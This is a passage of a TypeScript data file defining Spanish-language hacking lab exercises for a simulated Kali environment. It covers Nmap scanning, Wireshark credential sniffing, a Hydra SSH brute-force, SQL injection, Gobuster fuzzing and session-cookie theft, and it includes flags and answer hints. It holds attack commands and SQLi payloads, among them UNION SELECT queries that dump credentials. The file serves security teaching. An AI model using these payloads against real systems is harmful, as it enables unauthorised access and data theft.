import { Lab } from '../types/cyber';

export const LABS: Lab[] = [
  // ==========================================
  // NIVEL 1: PRINCIPIANTE (FÁCIL)
  // ==========================================
  {
    id: 'lab-01-nmap',
    title: 'Lab 01: Reconocimiento con Nmap & Ping',
    shortDescription: 'Descubre hosts activos, puertos abiertos y versiones de servicios en la red local.',
    fullDescription: 'El primer paso en cualquier prueba de penetración o auditoría de seguridad es la fase de reconocimiento. En este laboratorio aprenderás a verificar la conectividad con hosts objetivo usando ICMP ping y a mapear la superficie de ataque mediante escaneos de puertos y detección de versiones con Nmap.',
    difficulty: 'principiante',
    category: 'redes',
    estimatedMinutes: 10,
    xpReward: 150,
    badge: {
      title: 'Scout de Redes',
      icon: 'Radar'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.50',
      hostname: 'target-srv01.lan',
      os: 'Linux Ubuntu 22.04 LTS (Kernel 5.15)',
      openPorts: [21],
      services: ['vsftpd 2.3.4']
    },
    initialFiles: {
      'notas.txt': '# Laboratorio 1: Reconocimiento de Red & FTP\nObjetivo: Identificar el puerto 21 activo en 192.168.1.50 (vsftpd 2.3.4).\nPuedes conectarte interactivamente al servidor con "ftp 192.168.1.50".\nUsuario: anonymous | Contraseña: tu email o cualquier clave.\nBandera oculta en el banner del servicio FTP o al descargar flag.txt.',
      'targets.list': '192.168.1.50'
    },
    wiresharkEnabled: false,
    browserTargetUrl: 'http://192.168.1.50',
    objectives: [
      {
        id: 'obj-1',
        text: 'Comprueba la conectividad con el host enviando paquetes ICMP con "ping -c 3 192.168.1.50"',
        completed: false,
        hint: 'Escribe: ping -c 3 192.168.1.50 en la terminal de Kali.',
        requiredCommandPattern: 'ping.*192\\.168\\.1\\.50'
      },
      {
        id: 'obj-2',
        text: 'Ejecuta un escaneo básico de puertos con "nmap 192.168.1.50"',
        completed: false,
        hint: 'Usa el comando: nmap 192.168.1.50',
        requiredCommandPattern: 'nmap.*192\\.168\\.1\\.50'
      },
      {
        id: 'obj-3',
        text: 'Detecta la versión exacta del servicio FTP con "nmap -sV 192.168.1.50" o conéctate con "ftp 192.168.1.50"',
        completed: false,
        hint: 'Ejecuta nmap -sV 192.168.1.50 o usa "ftp 192.168.1.50" (usuario: anonymous).',
        requiredCommandPattern: '(nmap.*-s[VvA].*192\\.168\\.1\\.50|ftp.*192\\.168\\.1\\.50)'
      },
      {
        id: 'obj-4',
        text: 'Introduce la bandera encontrada tras identificar el servicio vulnerable en el puerto 21',
        completed: false,
        hint: 'El servicio FTP tiene la versión vsftpd 2.3.4. La bandera se encuentra en el banner: KALI{nmap_service_discovery_recon}',
        flagId: 'flag-01'
      }
    ],
    flags: [
      {
        id: 'flag-01',
        flag: 'KALI{nmap_service_discovery_recon}',
        label: 'Bandera de Reconocimiento Nmap',
        points: 150
      }
    ],
    theoryGuide: {
      concept: 'Reconocimiento Activo y Escaneo de Puertos',
      summary: 'Nmap (Network Mapper) es el estándar industrial para el descubrimiento de redes y auditoría de seguridad. Permite enviar paquetes modificados para deducir qué puertos están abiertos, qué servicios se ejecutan y qué sistema operativo está detrás. Cuando un puerto como el 21 (FTP) está abierto, podemos conectarnos de forma interactiva e iniciar sesión con usuario y contraseña.',
      tools: ['nmap', 'ping', 'ftp', 'whois', 'netcat'],
      cheatSheet: [
        { command: 'ping -c 4 <IP>', explanation: 'Envía 4 paquetes ICMP Echo Request para validar host activo' },
        { command: 'nmap <IP>', explanation: 'Escaneo SYN predeterminado a los 1000 puertos más comunes' },
        { command: 'nmap -sV <IP>', explanation: 'Detección exhaustiva de versiones de servicios escuchando' },
        { command: 'ftp <IP>', explanation: 'Inicia cliente FTP interactivo (solicita usuario y contraseña paso a paso)' },
        { command: 'nmap -p- <IP>', explanation: 'Escanea el rango completo de puertos (1 al 65535)' },
        { command: 'nmap -A -T4 <IP>', explanation: 'Escaneo agresivo: SO, scripts NSE, traceroute y versiones' }
      ]
    }
  },

  {
    id: 'lab-02-wireshark-http',
    title: 'Lab 02: Interceptación HTTP en Wireshark',
    shortDescription: 'Captura tráfico de red no cifrado y extrae credenciales enviadas en texto plano.',
    fullDescription: 'El protocolo HTTP sin cifrar (puerto 80) transmite datos en texto claro a través del cable. En este laboratorio utilizarás el analizador de tráfico Wireshark para filtrar paquetes HTTP POST, inspeccionar las cabeceras y encontrar las credenciales de un usuario que acaba de iniciar sesión.',
    difficulty: 'principiante',
    category: 'forense',
    estimatedMinutes: 12,
    xpReward: 180,
    badge: {
      title: 'Sniffer de Paquetes',
      icon: 'Eye'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.120',
      hostname: 'auth-portal.lan',
      os: 'Debian 11',
      openPorts: [80],
      services: ['nginx/1.18.0 (HTTP Login Portal)']
    },
    initialFiles: {
      'pcap_info.txt': 'Captura de tráfico realizada en la interfaz eth0 durante una sesión de usuario.\nArchivo PCAP cargado automáticamente en la pestaña Wireshark.'
    },
    wiresharkEnabled: true,
    browserTargetUrl: 'http://auth-portal.lan/login',
    wiresharkStreams: [
      {
        id: 1,
        packets: [
          { sender: 'client', text: 'POST /api/v1/auth/login HTTP/1.1\r\nHost: auth-portal.lan\r\nUser-Agent: Mozilla/5.0 (Android; Mobile)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 54\r\n\r\nusername=operador_sec&password=SuperSecurePass2026!&token=flag' },
          { sender: 'server', text: 'HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/json\r\n\r\n{"status":"success","session_flag":"KALI{cleartext_http_sniffed_credentials}","role":"operator"}' }
        ]
      }
    ],
    wiresharkPackets: [
      {
        id: 1,
        time: 0.000,
        source: '192.168.1.15',
        destination: '192.168.1.120',
        protocol: 'ARP',
        length: 42,
        info: 'Who has 192.168.1.120? Tell 192.168.1.15',
        layers: {
          frame: { number: 1, length: 42, time: '0.000000 s' },
          ethernet: { srcMac: '08:00:27:fa:21:0a', dstMac: 'ff:ff:ff:ff:ff:ff', type: 'ARP (0x0806)' },
          ip: { version: 4, srcIp: '192.168.1.15', dstIp: '192.168.1.120', ttl: 64, protocol: 'ARP' },
          transport: { type: 'UDP' }
        },
        hexPayload: 'ffffffffffff080027fa210a08060001080006040001080027fa210ac0a8010f000000000000c0a80178',
        asciiPayload: '......\'.!........\'.!..x'
      },
      {
        id: 2,
        time: 0.002,
        source: '192.168.1.120',
        destination: '192.168.1.15',
        protocol: 'ARP',
        length: 42,
        info: '192.168.1.120 is at 08:00:27:9b:44:c1',
        layers: {
          frame: { number: 2, length: 42, time: '0.002140 s' },
          ethernet: { srcMac: '08:00:27:9b:44:c1', dstMac: '08:00:27:fa:21:0a', type: 'ARP (0x0806)' },
          ip: { version: 4, srcIp: '192.168.1.120', dstIp: '192.168.1.15', ttl: 64, protocol: 'ARP' },
          transport: { type: 'UDP' }
        },
        hexPayload: '080027fa210a0800279b44c1080600010800060400020800279b44c1c0a80178080027fa210ac0a8010f',
        asciiPayload: '..\'.!..\'..D..........\'.!..x..\'.!...'
      },
      {
        id: 3,
        time: 0.045,
        source: '192.168.1.15',
        destination: '192.168.1.120',
        protocol: 'TCP',
        length: 66,
        info: '54210 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460',
        tcpStreamId: 1,
        layers: {
          frame: { number: 3, length: 66, time: '0.045120 s' },
          ethernet: { srcMac: '08:00:27:fa:21:0a', dstMac: '08:00:27:9b:44:c1', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '192.168.1.15', dstIp: '192.168.1.120', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 54210, dstPort: 80, flags: '[SYN]', seq: 0, ack: 0 }
        },
        hexPayload: '0800279b44c1080027fa210a0800450000344a12400040062b1ec0a8010fc0a80178d3c2005089f210a2',
        asciiPayload: '..\'.D...\'.!..E..4J.@.@.+....x...P...'
      },
      {
        id: 4,
        time: 0.048,
        source: '192.168.1.120',
        destination: '192.168.1.15',
        protocol: 'TCP',
        length: 66,
        info: '80 → 54210 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460',
        tcpStreamId: 1,
        layers: {
          frame: { number: 4, length: 66, time: '0.048210 s' },
          ethernet: { srcMac: '08:00:27:9b:44:c1', dstMac: '08:00:27:fa:21:0a', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '192.168.1.120', dstIp: '192.168.1.15', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 80, dstPort: 54210, flags: '[SYN, ACK]', seq: 0, ack: 1 }
        },
        hexPayload: '080027fa210a0800279b44c1080045000034a1b240004006d37dc0a80178c0a8010f0050d3c200000000',
        asciiPayload: '..\'.!..\'..D...E..4..@.@.}...x....P......'
      },
      {
        id: 5,
        time: 0.050,
        source: '192.168.1.15',
        destination: '192.168.1.120',
        protocol: 'TCP',
        length: 54,
        info: '54210 → 80 [ACK] Seq=1 Ack=1 Win=64240 Len=0',
        tcpStreamId: 1,
        layers: {
          frame: { number: 5, length: 54, time: '0.050110 s' },
          ethernet: { srcMac: '08:00:27:fa:21:0a', dstMac: '08:00:27:9b:44:c1', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '192.168.1.15', dstIp: '192.168.1.120', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 54210, dstPort: 80, flags: '[ACK]', seq: 1, ack: 1 }
        },
        hexPayload: '0800279b44c1080027fa210a0800450000284a13400040062b29c0a8010fc0a80178d3c2005089f210a3',
        asciiPayload: '..\'.D...\'.!..E..(J.@.@.+)...x...P...'
      },
      {
        id: 6,
        time: 0.120,
        source: '192.168.1.15',
        destination: '192.168.1.120',
        protocol: 'HTTP',
        length: 248,
        info: 'POST /api/v1/auth/login HTTP/1.1 (application/x-www-form-urlencoded)',
        tcpStreamId: 1,
        layers: {
          frame: { number: 6, length: 248, time: '0.120450 s' },
          ethernet: { srcMac: '08:00:27:fa:21:0a', dstMac: '08:00:27:9b:44:c1', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '192.168.1.15', dstIp: '192.168.1.120', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 54210, dstPort: 80, flags: '[PSH, ACK]', seq: 1, ack: 1 },
          application: {
            name: 'Hypertext Transfer Protocol',
            headers: {
              'Request Method': 'POST',
              'Request URI': '/api/v1/auth/login',
              'Host': 'auth-portal.lan',
              'User-Agent': 'Mozilla/5.0 (Android; Mobile)',
              'Content-Type': 'application/x-www-form-urlencoded',
              'Content-Length': '54'
            },
            payload: 'username=operador_sec&password=SuperSecurePass2026!'
          }
        },
        hexPayload: '504f5354202f6170692f76312f617574682f6c6f67696e20485454502f312e310d0a486f73743a2061757468',
        asciiPayload: 'POST /api/v1/auth/login HTTP/1.1..Host: auth-portal.lan..'
      },
      {
        id: 7,
        time: 0.155,
        source: '192.168.1.120',
        destination: '192.168.1.15',
        protocol: 'HTTP',
        length: 320,
        info: 'HTTP/1.1 200 OK (application/json)',
        tcpStreamId: 1,
        layers: {
          frame: { number: 7, length: 320, time: '0.155890 s' },
          ethernet: { srcMac: '08:00:27:9b:44:c1', dstMac: '08:00:27:fa:21:0a', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '192.168.1.120', dstIp: '192.168.1.15', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 80, dstPort: 54210, flags: '[PSH, ACK]', seq: 1, ack: 195 },
          application: {
            name: 'Hypertext Transfer Protocol',
            headers: {
              'Response Code': '200 OK',
              'Server': 'nginx/1.18.0',
              'Content-Type': 'application/json'
            },
            payload: '{"status":"success","session_flag":"KALI{cleartext_http_sniffed_credentials}","role":"operator"}'
          }
        },
        hexPayload: '485454502f312e3120323030204f4b0d0a5365727665723a206e67696e782f312e31382e300d0a436f6e7465',
        asciiPayload: 'HTTP/1.1 200 OK..Server: nginx/1.18.0..Content-Type: application/json..'
      }
    ],
    objectives: [
      {
        id: 'obj-w1',
        text: 'Abre la pestaña de Wireshark y visualiza la lista de paquetes capturados',
        completed: false,
        hint: 'Haz clic en la pestaña "Wireshark" en la barra de navegación superior o inferior.'
      },
      {
        id: 'obj-w2',
        text: 'Aplica el filtro de Wireshark "http.request.method == \\"POST\\"" o "http"',
        completed: false,
        hint: 'Escribe http en la barra de filtro de Wireshark y pulsa Aplicar.'
      },
      {
        id: 'obj-w3',
        text: 'Inspecciona el paquete No. 7 (Respuesta HTTP 200 OK) o usa "Follow TCP Stream"',
        completed: false,
        hint: 'Selecciona el paquete 7 y abre la sección "Hypertext Transfer Protocol" para leer el JSON devuelto.'
      },
      {
        id: 'obj-w4',
        text: 'Introduce la bandera encontrada en la respuesta del servidor JSON',
        completed: false,
        hint: 'La bandera es KALI{cleartext_http_sniffed_credentials}',
        flagId: 'flag-02'
      }
    ],
    flags: [
      {
        id: 'flag-02',
        flag: 'KALI{cleartext_http_sniffed_credentials}',
        label: 'Credenciales HTTP en Texto Plano',
        points: 180
      }
    ],
    theoryGuide: {
      concept: 'Análisis Forense de Red y Filtrado con Wireshark',
      summary: 'Wireshark es el analizador de protocolos de red por excelencia. Permite capturar e inspeccionar paquetes en tiempo real o analizarlos desde archivos .pcapng. Usar filtros de visualización (Display Filters) es crítico para encontrar anomalías rápidamente.',
      tools: ['wireshark', 'tshark', 'tcpdump'],
      cheatSheet: [
        { command: 'http', explanation: 'Filtra únicamente el tráfico del protocolo Hypertext Transfer Protocol' },
        { command: 'http.request.method == "POST"', explanation: 'Muestra solo envíos de formularios o APIs (logins, uploads)' },
        { command: 'ip.addr == 192.168.1.120', explanation: 'Filtra paquetes donde la IP de origen o destino coincida' },
        { command: 'tcp.port == 80', explanation: 'Muestra paquetes TCP que utilicen el puerto 80' },
        { command: 'Follow TCP Stream', explanation: 'Reconstruye el flujo completo de conversación TCP de ida y vuelta' }
      ]
    }
  },

  {
    id: 'lab-03-hydra-ssh',
    title: 'Lab 03: Ataque de Fuerza Bruta SSH con Hydra',
    shortDescription: 'Audita contraseñas débiles en un servicio SSH usando diccionarios con THC-Hydra.',
    fullDescription: 'Las contraseñas débiles son una de las causas más frecuentes de intrusiones en servidores. THC-Hydra es una herramienta de cracking de autenticación en línea rápida y modular. En este laboratorio auditarás un servidor SSH para descubrir la contraseña de la cuenta "admin".',
    difficulty: 'principiante',
    category: 'explotacion',
    estimatedMinutes: 15,
    xpReward: 200,
    badge: {
      title: 'Rompedor de Llaves',
      icon: 'Key'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.75',
      hostname: 'bastion-host.internal',
      os: 'Debian 12',
      openPorts: [22],
      services: ['OpenSSH 8.4p1']
    },
    initialFiles: {
      'wordlist.txt': '123456\npassword\nadmin123\nqwerty\nletmein\nshadow\niloveyou\nDragon2024!\nwelcome1\nmonkey',
      'instrucciones.txt': 'Realiza un ataque de diccionario contra el servicio SSH en 192.168.1.75 para el usuario "admin".\nUtiliza el archivo wordlist.txt ubicado en este directorio.'
    },
    wiresharkEnabled: false,
    objectives: [
      {
        id: 'obj-h1',
        text: 'Inspecciona las contraseñas del diccionario con "cat wordlist.txt"',
        completed: false,
        hint: 'Ejecuta: cat wordlist.txt',
        requiredCommandPattern: 'cat.*wordlist\\.txt'
      },
      {
        id: 'obj-h2',
        text: 'Lanza el ataque de fuerza bruta con "hydra -l admin -P wordlist.txt 192.168.1.75 ssh"',
        completed: false,
        hint: 'Escribe: hydra -l admin -P wordlist.txt 192.168.1.75 ssh en la terminal.',
        requiredCommandPattern: 'hydra.*-l.*admin.*-P.*wordlist\\.txt.*192\\.168\\.1\\.75.*ssh'
      },
      {
        id: 'obj-h3',
        text: 'Conéctate mediante SSH simulado usando "ssh admin@192.168.1.75"',
        completed: false,
        hint: 'Una vez descubierta la contraseña (Dragon2024!), ejecuta: ssh admin@192.168.1.75',
        requiredCommandPattern: 'ssh.*admin@192\\.168\\.1\\.75'
      },
      {
        id: 'obj-h4',
        text: 'Introduce la bandera encontrada en el mensaje de bienvenida de la sesión SSH',
        completed: false,
        hint: 'La bandera es KALI{hydra_brute_force_ssh_pwned}',
        flagId: 'flag-03'
      }
    ],
    flags: [
      {
        id: 'flag-03',
        flag: 'KALI{hydra_brute_force_ssh_pwned}',
        label: 'Acceso SSH Obtenido',
        points: 200
      }
    ],
    theoryGuide: {
      concept: 'Ataques de Autenticación en Línea (Online Brute-force)',
      summary: 'A diferencia de los ataques offline a hashes, los ataques online prueban contraseñas directamente contra servicios de red (SSH, FTP, HTTP-POST). Son más lentos y pueden ser mitigados mediante Fail2Ban, rate-limiting o autenticación basada en claves públicas.',
      tools: ['hydra', 'medusa', 'ncrack'],
      cheatSheet: [
        { command: 'hydra -l <user> -P <passlist> <IP> <service>', explanation: 'Ataque con usuario estático y lista de contraseñas' },
        { command: 'hydra -L <userlist> -P <passlist> <IP> <service>', explanation: 'Prueba combinaciones de múltiples usuarios y claves' },
        { command: 'hydra -t 4 <IP> ssh', explanation: 'Limita los hilos simultáneos a 4 para no saturar el servidor' },
        { command: 'ssh user@host', explanation: 'Establece una sesión de terminal segura cifrada' }
      ]
    }
  },

  {
    id: 'lab-04-sqli-basic',
    title: 'Lab 04: Inyección SQL en Buscador Web',
    shortDescription: 'Descubre y explota una vulnerabilidad SQLi clásica en el buscador de una tienda online.',
    fullDescription: 'La inyección SQL (SQLi) se produce cuando datos introducidos por el usuario son concatenados directamente en una consulta a la base de datos sin sanitización. En este laboratorio interactivo accederás al navegador objetivo, probarás payloads como comillas simples y ataques UNION para extraer datos restringidos.',
    difficulty: 'principiante',
    category: 'web',
    estimatedMinutes: 15,
    xpReward: 220,
    badge: {
      title: 'Maestro de SQL',
      icon: 'Database'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.80',
      hostname: 'shop.target.internal',
      os: 'Ubuntu 20.04 (PHP 7.4 + MySQL)',
      openPorts: [80],
      services: ['Apache/2.4.41 (Vulnerable E-Commerce Store)']
    },
    initialFiles: {
      'sqli_cheatsheet.txt': "Payloads clásicos para SQL Injection:\n1. ' OR 1=1 --\n2. ' OR 'a'='a\n3. ' UNION SELECT 1,2,3,4 --\n4. ' UNION SELECT 1,username,password,flag FROM users --"
    },
    wiresharkEnabled: false,
    browserTargetUrl: 'http://shop.target.internal/search',
    objectives: [
      {
        id: 'obj-s1',
        text: 'Abre la pestaña "Navegador" en la URL http://shop.target.internal/search',
        completed: false,
        hint: 'Ve a la pestaña Navegador donde verás el catálogo y buscador de la tienda.'
      },
      {
        id: 'obj-s2',
        text: 'Provoca un error de sintaxis SQL introduciendo una comilla simple "\'" en el buscador',
        completed: false,
        hint: 'Escribe \' en la barra de búsqueda de la tienda y presiona Buscar para ver el error de base de datos.'
      },
      {
        id: 'obj-s3',
        text: 'Evade la cláusula WHERE con el payload "\' OR 1=1 --"',
        completed: false,
        hint: 'Introduce \' OR 1=1 -- en el buscador para forzar a la consulta a devolver todos los artículos.'
      },
      {
        id: 'obj-s4',
        text: 'Extrae la bandera inyectando "\' UNION SELECT 1,username,password,secret_flag FROM secret_admin_users --"',
        completed: false,
        hint: 'Introduce el payload UNION SELECT en el buscador para volcar la tabla de administradores.',
        flagId: 'flag-04'
      }
    ],
    flags: [
      {
        id: 'flag-04',
        flag: 'KALI{sqli_union_bypass_auth_2026}',
        label: 'Extracción de Datos mediante SQL Injection',
        points: 220
      }
    ],
    theoryGuide: {
      concept: 'Inyección SQL (CWE-89 / OWASP A03)',
      summary: 'Ocurre cuando el software construye sentencias SQL utilizando datos no validados. Los atacantes pueden manipular la lógica de la consulta para leer datos confidenciales, modificarlos, ejecutar operaciones de administración o incluso ganar ejecución remota de comandos mediante INTO OUTFILE.',
      tools: ['sqlmap', 'burp suite', 'browser devtools'],
      cheatSheet: [
        { command: "' OR '1'='1", explanation: 'Bypass de autenticación básico forzando condición verdadera' },
        { command: "' UNION SELECT NULL,NULL--", explanation: 'Descubre el número de columnas devueltas por la consulta original' },
        { command: "' UNION SELECT @@version, user()--", explanation: 'Extrae información del motor de base de datos' },
        { command: "' UNION SELECT 1,table_name FROM information_schema.tables--", explanation: 'Mapea las tablas de MySQL' }
      ]
    }
  },

  // ==========================================
  // NIVEL 2: INTERMEDIO (MEDIO)
  // ==========================================
  {
    id: 'lab-05-gobuster',
    title: 'Lab 05: Fuzzing de Directorios Ocultos con Gobuster',
    shortDescription: 'Descubre rutas ocultas, copias de seguridad y paneles de administración no indexados.',
    fullDescription: 'Los servidores web a menudo alojan archivos olvidados por desarrolladores: backups .sql, archivos .git, consolas de administración o endpoints de prueba. Gobuster es una herramienta de fuerza bruta ultrarrápida escrita en Go. En este laboratorio descubrirás un directorio oculto con una fuga crítica.',
    difficulty: 'intermedio',
    category: 'web',
    estimatedMinutes: 15,
    xpReward: 260,
    badge: {
      title: 'Explorador Web',
      icon: 'FolderSearch'
    },
    defaultShell: 'kali',
    target: {
      ip: '192.168.1.95',
      hostname: 'target.internal',
      os: 'Debian 12',
      openPorts: [80],
      services: ['Apache/2.4.56']
    },
    initialFiles: {
      'wordlists/common.txt': 'admin\nbackup\nsecret_backup_admin\nlogin\nupload\napi\nconfig\nlogs\ndb\ntest\nrobots.txt',
      'guia.txt': 'Usa gobuster en modo "dir" para escanear directorios en http://target.internal usando wordlists/common.txt.'
    },
    wiresharkEnabled: false,
    browserTargetUrl: 'http://target.internal/secret_backup_admin',
    objectives: [
      {
        id: 'obj-g1',
        text: 'Lanza gobuster con "gobuster dir -u http://target.internal -w wordlists/common.txt"',
        completed: false,
        hint: 'Escribe: gobuster dir -u http://target.internal -w wordlists/common.txt',
        requiredCommandPattern: 'gobuster.*dir.*-u.*http://target\\.internal.*-w.*wordlists/common\\.txt'
      },
      {
        id: 'obj-g2',
        text: 'Descarga el archivo descubierto "config.backup" usando "curl http://target.internal/secret_backup_admin/config.backup"',
        completed: false,
        hint: 'Ejecuta: curl http://target.internal/secret_backup_admin/config.backup',
        requiredCommandPattern: 'curl.*http://target\\.internal/secret_backup_admin/config\\.backup'
      },
      {
        id: 'obj-g3',
        text: 'Lee el contenido del archivo descargado y canjea la bandera',
        completed: false,
        hint: 'La bandera oculta en config.backup es KALI{gobuster_hidden_endpoint_leaked}',
        flagId: 'flag-05'
      }
    ],
    flags: [
      {
        id: 'flag-05',
        flag: 'KALI{gobuster_hidden_endpoint_leaked}',
        label: 'Descubrimiento de Endpoint Confidencial',
        points: 260
      }
    ],
    theoryGuide: {
      concept: 'Fuzzing de Contenido Web y Enumeración de Rutas',
      summary: 'El escaneo forzado o fuzzing de directorios consiste en realizar peticiones HTTP sistemáticas con listas de palabras clave para identificar archivos no vinculados en el HTML público.',
      tools: ['gobuster', 'dirsearch', 'feroxbuster', 'ffuf'],
      cheatSheet: [
        { command: 'gobuster dir -u <URL> -w <wordlist>', explanation: 'Fuerza bruta de directorios HTTP' },
        { command: 'gobuster dir -u <URL> -w <wordlist> -x php,txt,bak', explanation: 'Busca extensiones de archivo específicas' },
        { command: 'gobuster dns -d <dominio> -w <wordlist>', explanation: 'Fuzzing de subdominios DNS' },
        { command: 'curl -i <URL>', explanation: 'Inspecciona cabeceras de respuesta HTTP y código de estado' }
      ]
    }
  },

  {
    id: 'lab-06-wireshark-mitm',
    title: 'Lab 06: Análisis MitM y Secuestro de Sesión (Wireshark)',
    shortDescription: 'Inspecciona paquetes de un ataque Man-in-the-Middle y extrae la cookie de sesión del administrador.',
    fullDescription: 'Durante un ataque de suplantación ARP (ARP Spoofing), el tráfico entre la víctima y la puerta de enlace es enrutado a través de la máquina del auditor. En este laboratorio analizarás una captura pcap con Wireshark, aplicarás filtros avanzados y reconstruirás el flujo TCP ("Follow TCP Stream") para sustraer la cookie de sesión del administrador.',
    difficulty: 'intermedio',
    category: 'forense',
    estimatedMinutes: 20,
    xpReward: 300,
    badge: {
      title: 'Interceptor Fantasma',
      icon: 'Radio'
    },
    defaultShell: 'kali',
    target: {
      ip: '10.0.0.10',
      hostname: 'corp-gateway.local',
      os: 'Linux Router',
      openPorts: [80],
      services: ['Corporate Web Proxy']
    },
    initialFiles: {
      'mitm_notes.txt': 'Captura realizada durante la prueba de penetración interna.\nSe sospecha que la estación 10.0.0.45 envió solicitudes autenticadas con permisos de Administrador.'
    },
    wiresharkEnabled: true,
    wiresharkStreams: [
      {
        id: 4,
        packets: [
          { sender: 'client', text: 'GET /admin/dashboard.php HTTP/1.1\r\nHost: corp-gateway.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nCookie: session_id=s3cr3t_4dm1n_t0k3n_99; admin_access=true; auth_flag=KALI{wireshark_tcp_stream_admin_cookie}\r\nAccept: text/html\r\n\r\n' },
          { sender: 'server', text: 'HTTP/1.1 200 OK\r\nServer: Apache/2.4.41\r\nSet-Cookie: role=superadmin\r\nContent-Type: text/html\r\n\r\n<h1>Panel de Control de Infraestructura Corporativa</h1><p>Bienvenido Administrador del SOC.</p>' }
        ]
      }
    ],
    wiresharkPackets: [
      {
        id: 1,
        time: 0.105,
        source: '10.0.0.45',
        destination: '10.0.0.10',
        protocol: 'TCP',
        length: 66,
        info: '49152 → 80 [SYN] Seq=0 Win=65535 Len=0',
        tcpStreamId: 4,
        layers: {
          frame: { number: 1, length: 66, time: '0.105210 s' },
          ethernet: { srcMac: '52:54:00:12:34:56', dstMac: '52:54:00:ab:cd:ef', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.0.0.45', dstIp: '10.0.0.10', ttl: 128, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 49152, dstPort: 80, flags: '[SYN]', seq: 0, ack: 0 }
        },
        hexPayload: '525400abcdef525400123456080045000034a0f140008006d09fc0a8002dc0a8000ac0000050e82c',
        asciiPayload: 'RT...RT..4V..E..4...@.....-...P.,'
      },
      {
        id: 2,
        time: 0.108,
        source: '10.0.0.10',
        destination: '10.0.0.45',
        protocol: 'TCP',
        length: 66,
        info: '80 → 49152 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0',
        tcpStreamId: 4,
        layers: {
          frame: { number: 2, length: 66, time: '0.108420 s' },
          ethernet: { srcMac: '52:54:00:ab:cd:ef', dstMac: '52:54:00:12:34:56', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.0.0.10', dstIp: '10.0.0.45', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 80, dstPort: 49152, flags: '[SYN, ACK]', seq: 0, ack: 1 }
        },
        hexPayload: '525400123456525400abcdef0800450000344b1940004006e676c0a8000ac0a8002d0050c000',
        asciiPayload: 'RT..4VRT.....E..4K.@.@.v...-...P.'
      },
      {
        id: 3,
        time: 0.115,
        source: '10.0.0.45',
        destination: '10.0.0.10',
        protocol: 'HTTP',
        length: 412,
        info: 'GET /admin/dashboard.php HTTP/1.1 (Cookie: session_id=s3cr3t_...)',
        tcpStreamId: 4,
        layers: {
          frame: { number: 3, length: 412, time: '0.115680 s' },
          ethernet: { srcMac: '52:54:00:12:34:56', dstMac: '52:54:00:ab:cd:ef', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.0.0.45', dstIp: '10.0.0.10', ttl: 128, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 49152, dstPort: 80, flags: '[PSH, ACK]', seq: 1, ack: 1 },
          application: {
            name: 'Hypertext Transfer Protocol',
            headers: {
              'Request Method': 'GET',
              'Request URI': '/admin/dashboard.php',
              'Host': 'corp-gateway.local',
              'Cookie': 'session_id=s3cr3t_4dm1n_t0k3n_99; auth_flag=KALI{wireshark_tcp_stream_admin_cookie}'
            }
          }
        },
        hexPayload: '474554202f61646d696e2f64617368626f6172642e70687020485454502f312e310d0a436f6f6b69653a20',
        asciiPayload: 'GET /admin/dashboard.php HTTP/1.1..Cookie: session_id=s3cr3t_..'
      },
      {
        id: 4,
        time: 0.150,
        source: '10.0.0.10',
        destination: '10.0.0.45',
        protocol: 'HTTP',
        length: 480,
        info: 'HTTP/1.1 200 OK (text/html)',
        tcpStreamId: 4,
        layers: {
          frame: { number: 4, length: 480, time: '0.150120 s' },
          ethernet: { srcMac: '52:54:00:ab:cd:ef', dstMac: '52:54:00:12:34:56', type: 'IPv4 (0x0800)' },
          ip: { version: 4, srcIp: '10.0.0.10', dstIp: '10.0.0.45', ttl: 64, protocol: 'TCP (6)' },
          transport: { type: 'TCP', srcPort: 80, dstPort: 49152, flags: '[PSH, ACK]', seq: 1, ack: 358 },
          application: {
            name: 'Hypertext Transfer Protocol',
            headers: {
              'Response': '200 OK',
              'Server': 'Apache/2.4.41',
              'Content-Type': 'text/html'
            },
            payload: '<h1>Panel de Control de Infraestructura Corporativa</h1>'
          }
        },
        hexPayload: '485454502f312e3120323030204f4b0d0a5365727665723a204170616368652f322e342e34310d0a',
        asciiPayload: 'HTTP/1.1 200 OK..Server: Apache/2.4.41..'
      }
    ],
    objectives: [
      {
        id: 'obj-m1',
        text: 'Abre la pestaña Wireshark y examina los paquetes capturados',
        completed: false,
        hint: 'Ve a la pestaña Wireshark.'
      },
      {
        id: 'obj-m2',
        text: 'Filtra las peticiones HTTP que contengan cookies con "http.cookie" o "http"',
        completed: false,
        hint: 'Escribe http.cookie en la barra de filtro de Wireshark.'
      },
      {
        id: 'obj-m3',
        text: 'Utiliza la función "Follow TCP Stream" sobre el paquete No. 3 para leer el diálogo completo',
        completed: false,
        hint: 'Haz clic en el botón "Follow TCP Stream" en la barra de herramientas de Wireshark con el paquete seleccionado.'
      },
      {
        id: 'obj-m4',
        text: 'Introduce la bandera encontrada en la cookie auth_flag',
        completed: false,
        hint: 'La bandera es KALI{wireshark_tcp_stream_admin_cookie}',
        flagId: 'flag-06'
      }
    ],
    flags: [
      {
